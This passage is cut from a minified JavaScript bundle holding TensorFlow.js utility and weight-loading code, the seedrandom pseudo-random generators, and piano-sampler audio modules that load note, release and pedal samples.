("+e.dtype+") input must match")},n.flatten=s,n.inferShape=function(t){if(h(t))return[t.length];if(!Array.isArray(t))return[];for(var e=[];t instanceof Array;)e.push(t.length),t=t[0];return e},n.sizeFromShape=function(t){if(0===t.length)return 1;for(var e=t[0],n=1;n<t.length;n++)e*=t[n];return e},n.isScalarShape=function(t){return 0===t.length},n.arraysEqual=a,n.isInt=function(t){return t%1==0},n.tanh=function(t){if(null!=Math.tanh)return Math.tanh(t);if(t===1/0)return 1;if(t===-1/0)return-1;var e=Math.exp(2*t);return(e-1)/(e+1)},n.sizeToSquarishShape=function(t){for(var e=Math.floor(Math.sqrt(t));e>1;--e)if(t%e==0)return[e,t/e];return[1,t]},n.createShuffledIndices=function(t){for(var e=new Uint32Array(t),n=0;n<t;++n)e[n]=n;return i(e),e},n.rightPad=function(t,e){return e<=t.length?t:t+" ".repeat(e-t.length)},n.repeatedTry=function(t,e,n){return void 0===e&&(e=function(t){return 0}),new Promise((function(r,i){var o=0,s=function(){if(t())r();else{o++;var a=e(o);null!=n&&o>=n?i():setTimeout(s,a)}};setTimeout(s,0)}))},n.getQueryParams=function(t){var e={};return t.replace(/[?&]([^=?&]+)(?:=([^&]*))?/g,(function(t){for(var n=[],r=1;r<arguments.length;r++)n[r-1]=arguments[r];return u(e,n[0],n[1]),n.join("=")})),e},n.inferFromImplicitShape=function(t,e){for(var n=1,r=-1,i=0;i<t.length;++i)if(t[i]>0)n*=t[i];else if(-1===t[i]){if(-1!==r)throw Error("Shapes can only have 1 implicit size. Found -1 at dim "+r+" and dim "+i);r=i}else if(t[i]<=0)throw Error("Shapes can not be <= 0. Found "+t[i]+" at dim "+i);if(-1===r){if(e>0&&e!==n)throw Error("Size ("+e+") must match the product of shape "+t);return t}if(e%n!=0)throw Error("The implicit shape can't be a fractional number. Got "+e+" / "+n);var o=t.slice();return o[r]=e/n,o},n.NAN_INT32=1<<31,n.NAN_BOOL=255,n.NAN_FLOAT32=NaN,n.getNaN=c,n.isValNaN=l,n.squeezeShape=function(t,e){for(var n=[],r=[],i=0,o=0;o<t.length;++o){if(null!=e){if(e[i]===o&&t[o]>1)throw new Error("Can't squeeze axis "+o+" since its dim '"+t[o]+"' is not 1");(null==e[i]||e[i]>o)&&1===t[o]&&(n.push(t[o]),r.push(o)),e[i]<=o&&i++}t[o]>1&&(n.push(t[o]),r.push(o))}return{newShape:n,keptDims:r}},n.getTypedArrayFromDType=function(t,e){var n=null;if(null==t||"float32"===t)n=new Float32Array(e);else if("int32"===t)n=new Int32Array(e);else{if("bool"!==t)throw new Error("Unknown data type "+t);n=new Uint8Array(e)}return n},n.isTensorInList=function(t,e){for(var n=0;n<e.length;n++)if(e[n].id===t.id)return!0;return!1},n.checkForNaN=function(t,e,n){for(var r=0;r<t.length;r++)if(l(t[r],e))throw Error("The result of the '"+n+"' has NaNs.")},n.flattenNameArrayMap=function(t,e){var n=[];if(t instanceof r.Tensor)n.push(t);else for(var i=t,o=0;o<e.length;o++)n.push(i[e[o]]);return n},n.unflattenToNameArrayMap=function(t,e){if(t.length!==e.length)throw new Error("Cannot unflatten Tensor[], keys and arrays are not of same length.");for(var n={},r=0;r<t.length;r++)n[t[r]]=e[r];return n},n.hasEncodingLoss=function(t,e){return"float32"!==e&&(("int32"!==e||"float32"===t)&&("bool"!==e||"bool"!==t))},n.copyTypedArray=function(t,e){if(null==e||"float32"===e)return new Float32Array(t);if("int32"===e){for(var n=new Int32Array(t.length),r=0;r<n.length;++r){l(o=t[r],"int32")?n[r]=c("int32"):n[r]=o}return n}if("bool"===e){var i=new Uint8Array(t.length);for(r=0;r<i.length;++r){var o;l(o=t[r],"bool")?i[r]=c("bool"):0!==Math.round(o)&&(i[r]=1)}return i}throw new Error("Unknown data type "+e)},n.isTypedArray=h,n.bytesPerElement=function(t){if("float32"===t||"int32"===t)return 4;if("bool"===t)return 1;throw new Error("Unknown dtype "+t)},n.isFunction=function(t){return!!(t&&t.constructor&&t.call&&t.apply)},n.extractTensorsFromContainer=function(t){return p(t)},n.extractTensorsFromAny=p},{"./tensor":137}],144:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});n.version="0.5.1"},{}],145:[function(t,e,n){"use strict";var r=this&&this.__awaiter||function(t,e,n,r){return new(n||(n=Promise))((function(i,o){function s(t){try{u(r.next(t))}catch(t){o(t)}}function a(t){try{u(r.throw(t))}catch(t){o(t)}}function u(t){t.done?i(t.value):new n((function(e){e(t.value)})).then(s,a)}u((r=r.apply(t,e||[])).next())}))},i=this&&this.__generator||function(t,e){var n,r,i,o,s={label:0,sent:function(){if(1&i[0])throw i[1];return i[1]},trys:[],ops:[]};return o={next:a(0),throw:a(1),return:a(2)},"function"==typeof Symbol&&(o[Symbol.iterator]=function(){return this}),o;function a(o){return function(a){return function(o){if(n)throw new TypeError("Generator is already executing.");for(;s;)try{if(n=1,r&&(i=r[2&o[0]?"return":o[0]?"throw":"next"])&&!(i=i.call(r,o[1])).done)return i;switch(r=0,i&&(o=[0,i.value]),o[0]){case 0:case 1:i=o;break;case 4:return s.label++,{value:o[1],done:!1};case 5:s.label++,r=o[1],o=[0];continue;case 7:o=s.ops.pop(),s.trys.pop();continue;default:if(!(i=s.trys,(i=i.length>0&&i[i.length-1])||6!==o[0]&&2!==o[0])){s=0;continue}if(3===o[0]&&(!i||o[1]>i[0]&&o[1]<i[3])){s.label=o[1];break}if(6===o[0]&&s.label<i[1]){s.label=i[1],i=o;break}if(i&&s.label<i[2]){s.label=i[2],s.ops.push(o);break}i[2]&&s.ops.pop(),s.trys.pop();continue}o=e.call(t,s)}catch(t){o=[6,t],r=0}finally{n=i=0}if(5&o[0])throw o[1];return{value:o[0]?o[1]:void 0,done:!0}}([o,a])}}};Object.defineProperty(n,"__esModule",{value:!0});var o=t("./ops/ops"),s=t("./util"),a={float32:4,int32:4};n.loadWeights=function(t,e,n){return void 0===e&&(e=""),r(this,void 0,void 0,(function(){var r,u,c,l,h,p,d,f,y,m,v;return i(this,(function(i){switch(i.label){case 0:if(r=t.map((function(){return!1})),u={},c=null!=n?n.map((function(){return!1})):[],l=[],t.forEach((function(t,e){var i=0;t.weights.forEach((function(t){var o=a[t.dtype]*s.sizeFromShape(t.shape),h=function(){r[e]=!0,null==u[e]&&(u[e]=[]),u[e].push({manifestEntry:t,groupOffset:i,sizeBytes:o})};null!=n?n.forEach((function(e,n){e===t.name&&(h(),c[n]=!0)})):h(),l.push(t.name),i+=o}))})),!c.every((function(t){return t})))throw h=n.filter((function(t,e){return!c[e]})),new Error("Could not find weights in manifest with names: "+h.join(", ")+". \nManifest JSON has weights with names: "+l.join(", ")+".");return p=r.reduce((function(t,e,n){return e&&t.push(n),t}),[]),d=[],p.forEach((function(n){t[n].paths.forEach((function(t){var n=e+(e.endsWith("/")?"":"/")+t;d.push(fetch(n))}))})),[4,Promise.all(d)];case 1:return f=i.sent(),[4,Promise.all(f.map((function(t){return t.arrayBuffer()})))];case 2:return y=i.sent(),m={},v=0,p.forEach((function(e){for(var n=t[e].paths.length,r=0,i=0;i<n;i++)r+=y[v+i].byteLength;for(var s=new ArrayBuffer(r),a=new Uint8Array(s),c=0,l=0;l<n;l++){var h=new Uint8Array(y[v+l]);a.set(h,c),c+=h.byteLength}u[e].forEach((function(t){var e,n=s.slice(t.groupOffset,t.groupOffset+t.sizeBytes);if("float32"===t.manifestEntry.dtype)e=new Float32Array(n);else{if("int32"!==t.manifestEntry.dtype)throw new Error("Weight "+t.manifestEntry.name+" has unknown dtype "+t.manifestEntry.dtype+".");e=new Int32Array(n)}var r=t.manifestEntry.name;if(null!=m[r])throw new Error("Duplicate weight with name "+r+". Please make sure weights names are unique in the manifest JSON.");m[r]=o.tensor(e,t.manifestEntry.shape,t.manifestEntry.dtype)})),v+=n})),[2,m]}}))}))}},{"./ops/ops":114,"./util":143}],146:[function(t,e,n){var r=t("./lib/alea"),i=t("./lib/xor128"),o=t("./lib/xorwow"),s=t("./lib/xorshift7"),a=t("./lib/xor4096"),u=t("./lib/tychei"),c=t("./seedrandom");c.alea=r,c.xor128=i,c.xorwow=o,c.xorshift7=s,c.xor4096=a,c.tychei=u,e.exports=c},{"./lib/alea":147,"./lib/tychei":148,"./lib/xor128":149,"./lib/xor4096":150,"./lib/xorshift7":151,"./lib/xorwow":152,"./seedrandom":153}],147:[function(t,e,n){!function(t,e,n){function r(t){var e,n=this,r=(e=4022871197,function(t){t=t.toString();for(var n=0;n<t.length;n++){var r=.02519603282416938*(e+=t.charCodeAt(n));r-=e=r>>>0,e=(r*=e)>>>0,e+=4294967296*(r-=e)}return 2.3283064365386963e-10*(e>>>0)});n.next=function(){var t=2091639*n.s0+2.3283064365386963e-10*n.c;return n.s0=n.s1,n.s1=n.s2,n.s2=t-(n.c=0|t)},n.c=1,n.s0=r(" "),n.s1=r(" "),n.s2=r(" "),n.s0-=r(t),n.s0<0&&(n.s0+=1),n.s1-=r(t),n.s1<0&&(n.s1+=1),n.s2-=r(t),n.s2<0&&(n.s2+=1),r=null}function i(t,e){return e.c=t.c,e.s0=t.s0,e.s1=t.s1,e.s2=t.s2,e}function o(t,e){var n=new r(t),o=e&&e.state,s=n.next;return s.int32=function(){return 4294967296*n.next()|0},s.double=function(){return s()+11102230246251565e-32*(2097152*s()|0)},s.quick=s,o&&("object"==typeof o&&i(o,n),s.state=function(){return i(n,{})}),s}e&&e.exports?e.exports=o:n&&n.amd?n((function(){return o})):this.alea=o}(0,"object"==typeof e&&e,!1)},{}],148:[function(t,e,n){!function(t,e,n){function r(t){var e=this,n="";e.next=function(){var t=e.b,n=e.c,r=e.d,i=e.a;return t=t<<25^t>>>7^n,n=n-r|0,r=r<<24^r>>>8^i,i=i-t|0,e.b=t=t<<20^t>>>12^n,e.c=n=n-r|0,e.d=r<<16^n>>>16^i,e.a=i-t|0},e.a=0,e.b=0,e.c=-1640531527,e.d=1367130551,t===Math.floor(t)?(e.a=t/4294967296|0,e.b=0|t):n+=t;for(var r=0;r<n.length+20;r++)e.b^=0|n.charCodeAt(r),e.next()}function i(t,e){return e.a=t.a,e.b=t.b,e.c=t.c,e.d=t.d,e}function o(t,e){var n=new r(t),o=e&&e.state,s=function(){return(n.next()>>>0)/4294967296};return s.double=function(){do{var t=((n.next()>>>11)+(n.next()>>>0)/4294967296)/(1<<21)}while(0===t);return t},s.int32=n.next,s.quick=s,o&&("object"==typeof o&&i(o,n),s.state=function(){return i(n,{})}),s}e&&e.exports?e.exports=o:n&&n.amd?n((function(){return o})):this.tychei=o}(0,"object"==typeof e&&e,!1)},{}],149:[function(t,e,n){!function(t,e,n){function r(t){var e=this,n="";e.x=0,e.y=0,e.z=0,e.w=0,e.next=function(){var t=e.x^e.x<<11;return e.x=e.y,e.y=e.z,e.z=e.w,e.w^=e.w>>>19^t^t>>>8},t===(0|t)?e.x=t:n+=t;for(var r=0;r<n.length+64;r++)e.x^=0|n.charCodeAt(r),e.next()}function i(t,e){return e.x=t.x,e.y=t.y,e.z=t.z,e.w=t.w,e}function o(t,e){var n=new r(t),o=e&&e.state,s=function(){return(n.next()>>>0)/4294967296};return s.double=function(){do{var t=((n.next()>>>11)+(n.next()>>>0)/4294967296)/(1<<21)}while(0===t);return t},s.int32=n.next,s.quick=s,o&&("object"==typeof o&&i(o,n),s.state=function(){return i(n,{})}),s}e&&e.exports?e.exports=o:n&&n.amd?n((function(){return o})):this.xor128=o}(0,"object"==typeof e&&e,!1)},{}],150:[function(t,e,n){!function(t,e,n){function r(t){var e=this;e.next=function(){var t,n,r=e.w,i=e.X,o=e.i;return e.w=r=r+1640531527|0,n=i[o+34&127],t=i[o=o+1&127],n^=n<<13,t^=t<<17,n^=n>>>15,t^=t>>>12,n=i[o]=n^t,e.i=o,n+(r^r>>>16)|0},function(t,e){var n,r,i,o,s,a=[],u=128;for(e===(0|e)?(r=e,e=null):(e+="\0",r=0,u=Math.max(u,e.length)),i=0,o=-32;o<u;++o)e&&(r^=e.charCodeAt((o+32)%e.length)),0===o&&(s=r),r^=r<<10,r^=r>>>15,r^=r<<4,r^=r>>>13,o>=0&&(s=s+1640531527|0,i=0==(n=a[127&o]^=r+s)?i+1:0);for(i>=128&&(a[127&(e&&e.length||0)]=-1),i=127,o=512;o>0;--o)r=a[i+34&127],n=a[i=i+1&127],r^=r<<13,n^=n<<17,r^=r>>>15,n^=n>>>12,a[i]=r^n;t.w=s,t.X=a,t.i=i}(e,t)}function i(t,e){return e.i=t.i,e.w=t.w,e.X=t.X.slice(),e}function o(t,e){null==t&&(t=+new Date);var n=new r(t),o=e&&e.state,s=function(){return(n.next()>>>0)/4294967296};return s.double=function(){do{var t=((n.next()>>>11)+(n.next()>>>0)/4294967296)/(1<<21)}while(0===t);return t},s.int32=n.next,s.quick=s,o&&(o.X&&i(o,n),s.state=function(){return i(n,{})}),s}e&&e.exports?e.exports=o:n&&n.amd?n((function(){return o})):this.xor4096=o}(0,"object"==typeof e&&e,!1)},{}],151:[function(t,e,n){!function(t,e,n){function r(t){var e=this;e.next=function(){var t,n,r=e.x,i=e.i;return t=r[i],n=(t^=t>>>7)^t<<24,n^=(t=r[i+1&7])^t>>>10,n^=(t=r[i+3&7])^t>>>3,n^=(t=r[i+4&7])^t<<7,t=r[i+7&7],n^=(t^=t<<13)^t<<9,r[i]=n,e.i=i+1&7,n},function(t,e){var n,r=[];if(e===(0|e))r[0]=e;else for(e=""+e,n=0;n<e.length;++n)r[7&n]=r[7&n]<<15^e.charCodeAt(n)+r[n+1&7]<<13;for(;r.length<8;)r.push(0);for(n=0;n<8&&0===r[n];++n);for(8==n?r[7]=-1:r[n],t.x=r,t.i=0,n=256;n>0;--n)t.next()}(e,t)}function i(t,e){return e.x=t.x.slice(),e.i=t.i,e}function o(t,e){null==t&&(t=+new Date);var n=new r(t),o=e&&e.state,s=function(){return(n.next()>>>0)/4294967296};return s.double=function(){do{var t=((n.next()>>>11)+(n.next()>>>0)/4294967296)/(1<<21)}while(0===t);return t},s.int32=n.next,s.quick=s,o&&(o.x&&i(o,n),s.state=function(){return i(n,{})}),s}e&&e.exports?e.exports=o:n&&n.amd?n((function(){return o})):this.xorshift7=o}(0,"object"==typeof e&&e,!1)},{}],152:[function(t,e,n){!function(t,e,n){function r(t){var e=this,n="";e.next=function(){var t=e.x^e.x>>>2;return e.x=e.y,e.y=e.z,e.z=e.w,e.w=e.v,(e.d=e.d+362437|0)+(e.v=e.v^e.v<<4^t^t<<1)|0},e.x=0,e.y=0,e.z=0,e.w=0,e.v=0,t===(0|t)?e.x=t:n+=t;for(var r=0;r<n.length+64;r++)e.x^=0|n.charCodeAt(r),r==n.length&&(e.d=e.x<<10^e.x>>>4),e.next()}function i(t,e){return e.x=t.x,e.y=t.y,e.z=t.z,e.w=t.w,e.v=t.v,e.d=t.d,e}function o(t,e){var n=new r(t),o=e&&e.state,s=function(){return(n.next()>>>0)/4294967296};return s.double=function(){do{var t=((n.next()>>>11)+(n.next()>>>0)/4294967296)/(1<<21)}while(0===t);return t},s.int32=n.next,s.quick=s,o&&("object"==typeof o&&i(o,n),s.state=function(){return i(n,{})}),s}e&&e.exports?e.exports=o:n&&n.amd?n((function(){return o})):this.xorwow=o}(0,"object"==typeof e&&e,!1)},{}],153:[function(t,e,n){!function(n,r){var i,o=this,s=256,a=r.pow(s,6),u=r.pow(2,52),c=2*u,l=255;function h(t,e,l){var h=[],v=y(f((e=1==e?{entropy:!0}:e||{}).entropy?[t,m(n)]:null==t?function(){try{var t;return i&&(t=i.randomBytes)?t=t(s):(t=new Uint8Array(s),(o.crypto||o.msCrypto).getRandomValues(t)),m(t)}catch(t){var e=o.navigator,r=e&&e.plugins;return[+new Date,o,r,o.screen,m(n)]}}():t,3),h),g=new p(h),_=function(){for(var t=g.g(6),e=a,n=0;t<u;)t=(t+n)*s,e*=s,n=g.g(1);for(;t>=c;)t/=2,e/=2,n>>>=1;return(t+n)/e};return _.int32=function(){return 0|g.g(4)},_.quick=function(){return g.g(4)/4294967296},_.double=_,y(m(g.S),n),(e.pass||l||function(t,e,n,i){return i&&(i.S&&d(i,g),t.state=function(){return d(g,{})}),n?(r.random=t,e):t})(_,v,"global"in e?e.global:this==r,e.state)}function p(t){var e,n=t.length,r=this,i=0,o=r.i=r.j=0,a=r.S=[];for(n||(t=[n++]);i<s;)a[i]=i++;for(i=0;i<s;i++)a[i]=a[o=l&o+t[i%n]+(e=a[i])],a[o]=e;(r.g=function(t){for(var e,n=0,i=r.i,o=r.j,a=r.S;t--;)e=a[i=l&i+1],n=n*s+a[l&(a[i]=a[o=l&o+e])+(a[o]=e)];return r.i=i,r.j=o,n})(s)}function d(t,e){return e.i=t.i,e.j=t.j,e.S=t.S.slice(),e}function f(t,e){var n,r=[],i=typeof t;if(e&&"object"==i)for(n in t)try{r.push(f(t[n],e-1))}catch(t){}return r.length?r:"string"==i?t:t+"\0"}function y(t,e){for(var n,r=t+"",i=0;i<r.length;)e[l&i]=l&(n^=19*e[l&i])+r.charCodeAt(i++);return m(e)}function m(t){return String.fromCharCode.apply(0,t)}if(r.seedrandom=h,y(r.random(),n),"object"==typeof e&&e.exports){e.exports=h;try{i=t("crypto")}catch(t){}}else 0}([],Math)},{crypto:2}],154:[function(t,e,n){var r,i;r=this,i=function(t){return function(t){function e(r){if(n[r])return n[r].exports;var i=n[r]={i:r,l:!1,exports:{}};return t[r].call(i.exports,i,i.exports,e),i.l=!0,i.exports}var n={};return e.m=t,e.c=n,e.i=function(t){return t},e.d=function(t,n,r){e.o(t,n)||Object.defineProperty(t,n,{configurable:!1,enumerable:!0,get:r})},e.n=function(t){var n=t&&t.__esModule?function(){return t.default}:function(){return t};return e.d(n,"a",n),n},e.o=function(t,e){return Object.prototype.hasOwnProperty.call(t,e)},e.p="",e(e.s=8)}([function(e,n){e.exports=t},function(t,e,n){"use strict";Object.defineProperty(e,"__esModule",{value:!0});var r=n(2);e.default={getReleasesUrl:function(t){return"rel"+(t-20)+".[mp3|ogg]"},getHarmonicsUrl:function(t){return"harmL"+(0,r.midiToNote)(t).replace("#","s")+".[mp3|ogg]"},getNotesUrl:function(t,e){return(0,r.midiToNote)(t).replace("#","s")+"v"+e+".[mp3|ogg]"}}},function(t,e,n){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.randomBetween=e.midiToFrequencyRatio=e.createSource=e.noteToMidi=e.midiToNote=void 0;var r=n(0),i=function(t){return t&&t.__esModule?t:{default:t}}(r);e.midiToNote=function(t){return(0,r.Frequency)(t,"midi").toNote()},e.noteToMidi=function(t){return(0,r.Frequency)(t).toMidi()},e.createSource=function(t){return new r.BufferSource(t)},e.midiToFrequencyRatio=function(t){var e=t%3;return 1===e?[t-1,i.default.intervalToFrequencyRatio(1)]:2===e?[t+1,i.default.intervalToFrequencyRatio(-1)]:[t,1]},e.randomBetween=function(t,e){return Math.random()*(e-t)+t}},function(t,e,n){"use strict";function r(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}function i(t,e){if(!t)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!e||"object"!=typeof e&&"function"!=typeof e?t:e}Object.defineProperty(e,"__esModule",{value:!0});var o=function(){function t(t,e){for(var n=0;n<e.length;n++){var r=e[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(t,r.key,r)}}return function(e,n,r){return n&&t(e.prototype,n),r&&t(e,r),e}}(),s=n(0),a=function(t){return t&&t.__esModule?t:{default:t}}(s),u=function(t){function e(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:0;r(this,e);var n=i(this,(e.__proto__||Object.getPrototypeOf(e)).call(this));return n.createInsOuts(0,1),n.volume=t,n}return function(t,e){if("function"!=typeof e&&null!==e)throw new TypeError("Super expression must either be null or a function, not "+typeof e);t.prototype=Object.create(e&&e.prototype,{constructor:{value:t,enumerable:!1,writable:!0,configurable:!0}}),e&&(Object.setPrototypeOf?Object.setPrototypeOf(t,e):t.__proto__=e)}(e,t),o(e,[{key:"volume",get:function(){return a.default.gainToDb(this.output.gain.value)},set:function(t){this.output.gain.value=a.default.dbToGain(t)}}]),e}(s.AudioNode);e.default=u},function(t,e,n){"use strict";function r(t){return t&&t.__esModule?t:{default:t}}function i(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}function o(t,e){if(!t)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!e||"object"!=typeof e&&"function"!=typeof e?t:e}Object.defineProperty(e,"__esModule",{value:!0});var s=function(){function t(t,e){for(var n=0;n<e.length;n++){var r=e[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(t,r.key,r)}}return function(e,n,r){return n&&t(e.prototype,n),r&&t(e,r),e}}(),a=r(n(1)),u=r(n(3)),c=n(2),l=n(0),h=[21,24,27,30,33,36,39,42,45,48,51,54,57,60,63,66,69,72,75,78,81,84,87],p=function(t){function e(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:[21,108];i(this,e);var n=o(this,(e.__proto__||Object.getPrototypeOf(e)).call(this)),r=h.findIndex((function(e){return e>=t[0]})),s=h.findIndex((function(e){return e>=t[1]}));s=-1===s?s=h.length:s;var u=h.slice(r,s);n._samples={};var c=!0,l=!1,p=void 0;try{for(var d,f=u[Symbol.iterator]();!(c=(d=f.next()).done);c=!0){var y=d.value;n._samples[y]=a.default.getHarmonicsUrl(y)}}catch(t){l=!0,p=t}finally{try{!c&&f.return&&f.return()}finally{if(l)throw p}}return n}return function(t,e){if("function"!=typeof e&&null!==e)throw new TypeError("Super expression must either be null or a function, not "+typeof e);t.prototype=Object.create(e&&e.prototype,{constructor:{value:t,enumerable:!1,writable:!0,configurable:!0}}),e&&(Object.setPrototypeOf?Object.setPrototypeOf(t,e):t.__proto__=e)}(e,t),s(e,[{key:"start",value:function(t,e,n){t>=h[0]&&t<=h[h.length-1]&&this._sampler.triggerAttack((0,c.midiToNote)(t),e,n*(0,c.randomBetween)(.5,1))}},{key:"load",value:function(t){var e=this;return new Promise((function(n,r){e._sampler=new l.Sampler(e._samples,n,t).connect(e.output),e._sampler.release=1}))}}]),e}(u.default);e.default=p},function(t,e,n){"use strict";function r(t){return t&&t.__esModule?t:{default:t}}function i(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}function o(t,e){if(!t)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!e||"object"!=typeof e&&"function"!=typeof e?t:e}Object.defineProperty(e,"__esModule",{value:!0}),e.Notes=void 0;var s=function(t,e){if(Array.isArray(t))return t;if(Symbol.iterator in Object(t))return function(t,e){var n=[],r=!0,i=!1,o=void 0;try{for(var s,a=t[Symbol.iterator]();!(r=(s=a.next()).done)&&(n.push(s.value),!e||n.length!==e);r=!0);}catch(t){i=!0,o=t}finally{try{!r&&a.return&&a.return()}finally{if(i)throw o}}return n}(t,e);throw new TypeError("Invalid attempt to destructure non-iterable instance")},a=function(){function t(t,e){for(var n=0;n<e.length;n++){var r=e[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(t,r.key,r)}}return function(e,n,r){return n&&t(e.prototype,n),r&&t(e,r),e}}(),u=n(0),c=(r(u),n(1)),l=r(c),h=r(n(3)),p=n(2),d={1:[8],2:[6,12],3:[1,8,15],4:[1,5,10,15],5:[1,4,8,12,16],6:[1,3,7,10,13,16],7:[1,3,6,9,11,13,16],8:[1,3,5,7,9,11,13,15],9:[1,3,5,7,9,11,13,15,16],10:[1,2,3,5,7,9,11,13,15,16],11:[1,2,3,5,7,9,11,13,14,15,16],12:[1,2,3,4,5,7,9,11,13,14,15,16],13:[1,2,3,4,5,7,9,11,12,13,14,15,16],14:[1,2,3,4,5,6,7,9,11,12,13,14,15,16],15:[1,2,3,4,5,6,7,9,10,11,12,13,14,15,16],16:[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]},f=[21,24,27,30,33,36,39,42,45,48,51,54,57,60,63,66,69,72,75,78,81,84,87,90,93,96,99,102,105,108];e.Notes=function(t){function e(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:[21,108],n=arguments.length>1&&void 0!==arguments[1]?arguments[1]:1;i(this,e);var r=o(this,(e.__proto__||Object.getPrototypeOf(e)).call(this)),s=f.findIndex((function(e){return e>=t[0]})),a=f.findIndex((function(e){return e>=t[1]}));a=-1===a?a=f.length:a+1;var u=f.slice(s,a);return r._samplers=d[n].slice(),r._activeNotes=new Map,r._samplers.forEach((function(t,e){r._samplers[e]={},u.forEach((function(n){r._samplers[e][n]=l.default.getNotesUrl(n,t)}))})),r}return function(t,e){if("function"!=typeof e&&null!==e)throw new TypeError("Super expression must either be null or a function, not "+typeof e);t.prototype=Object.create(e&&e.prototype,{constructor:{value:t,enumerable:!1,writable:!0,configurable:!0}}),e&&(Object.setPrototypeOf?Object.setPrototypeOf(t,e):t.__proto__=e)}(e,t),a(e,[{key:"_hasNote",value:function(t,e){return this._samplers.hasOwnProperty(e)&&this._samplers[e].has(t)}},{key:"_getNote",value:function(t,e){return this._samplers[e].get(t)}},{key:"stop",value:function(t,e,n){this._activeNotes.has(t)&&(this._activeNotes.get(t).forEach((function(t){t.stop(e+1,1)})),this._activeNotes.delete(t))}},{key:"start",value:function(t,e,n){var r=n*(this._samplers.length-1),i=Math.round(r),o=1-.5*(i-r);1===this._samplers.length&&(o=Math.max(n,.05));var a=(0,p.midiToFrequencyRatio)(t),u=s(a,2),c=u[0],l=u[1];if(this._hasNote(c,i)){var h=(0,p.createSource)(this._getNote(c,i));h.playbackRate.value=l,h.connect(this.output),h.curve="exponential",h.start(e,0,void 0,o,0),this._activeNotes.has(t)||this._activeNotes.set(t,[]),this._activeNotes.get(t).push(h)}}},{key:"load",value:function(t){var e=this,n=[];return this._samplers.forEach((function(r,i){var o=new Promise((function(n){e._samplers[i]=new u.Buffers(r,n,t)}));n.push(o)})),Promise.all(n)}}]),e}(h.default)},function(t,e,n){"use strict";function r(t){return t&&t.__esModule?t:{default:t}}Object.defineProperty(e,"__esModule",{value:!0});var i=function(){function t(t,e){for(var n=0;n<e.length;n++){var r=e[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(t,r.key,r)}}return function(e,n,r){return n&&t(e.prototype,n),r&&t(e,r),e}}(),o=r(n(3)),s=(r(n(1)),n(2)),a=n(0),u=(r(a),function(t){function e(){!function(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}(this,e);var t=function(t,e){if(!t)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!e||"object"!=typeof e&&"function"!=typeof e?t:e}(this,(e.__proto__||Object.getPrototypeOf(e)).call(this));return t._downTime=1/0,t._currentSound=null,t._buffers=null,t}return function(t,e){if("function"!=typeof e&&null!==e)throw new TypeError("Super expression must either be null or a function, not "+typeof e);t.prototype=Object.create(e&&e.prototype,{constructor:{value:t,enumerable:!1,writable:!0,configurable:!0}}),e&&(Object.setPrototypeOf?Object.setPrototypeOf(t,e):t.__proto__=e)}(e,t),i(e,[{key:"load",value:function(t){var e=this;return new Promise((function(n){e._buffers=new a.Buffers({up:"pedalU1.mp3",down:"pedalD1.mp3"},n,t)}))}},{key:"_squash",value:function(t){this._currentSound&&this._currentSound.stop(t+.1,.1),this._currentSound=null}},{key:"_playSample",value:function(t,e){this._currentSound=(0,s.createSource)(this._buffers.get(e)),this._currentSound.curve="exponential",this._currentSound.connect(this.output).start(t,(0,s.randomBetween)(0,.01),void 0,.5*(0,s.randomBetween)(.5,1),.05)}},{key:"down",value:function(t){this._squash(t),this._downTime=t,this._playSample(t,"down")}},{key:"up",value:function(t){this._squash(t),this._downTime=1/0,this._playSample(t,"up")}},{key:"isDown",value:function(t){return t>this._downTime}}]),e}(o.default));e.default=u},function(t,e,n){"use strict";function r(t){return t&&t.__esModule?t:{default:t}}Object.defineProperty(e,"__esModule",{value:!0});var i=function(){function t(t,e){for(var n=0;n<e.length;n++){var r=e[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(t,r.key,r)}}return function(e,n,r){return n&&t(e.prototype,n),r&&t(e,r),e}}(),o=r(n(1)),s=r(n(3)),a=n(2),u=n(0),c=function(t){function e(t){!function(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}(this,e);var n=function(t,e){if(!t)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!e||"object"!=typeof e&&"function"!=typeof e?t:e}(this,(e.__proto__||Object.getPrototypeOf(e)).call(this));n._buffers={};for(var r=t[0];r<=t[1];r++)n._buffers[r]=o.default.getReleasesUrl(r);return n}return function(t,e){if("function"!=typeof e&&null!==e)throw new TypeError("Super expression must either be null or a function, not "+typeof e);t.prototype=Object.create(e&&e.prototype,{constructor:{value:t,enumerable:!1,writable:!0,configurable:!0}}),e&&(Object.setPrototypeOf?Object.setPrototypeOf(t,e):t.__proto__=e)}(e,t),i(e,[{key:"load",value:function(t){var e=this;return new Promise((function(n){e._buffers=new u.Buffers(e._buffers,n,t)}))}},{key:"start",value:function(t,e,n){if(this._buffers.has(t)){var r=(0,a.createSource)(this._buffers.get(t)).connect(this.output);n*=(0,a.randomBetween)(.5,1),r.start(e,0,void 0,.015*n,0)}}}]),e}(s.default);e.default=c},function(t,e,n){"use strict";function r(t){return t&&t.__esModule?t:{default:t}}function i(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}function o(t,e){if(!t)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!e||"object"!=typeof e&&"function"!=typeof e?t:e}Object.defineProperty(e,"__esModule",{value:!0}),e.Piano=void 0;var s=function(){function 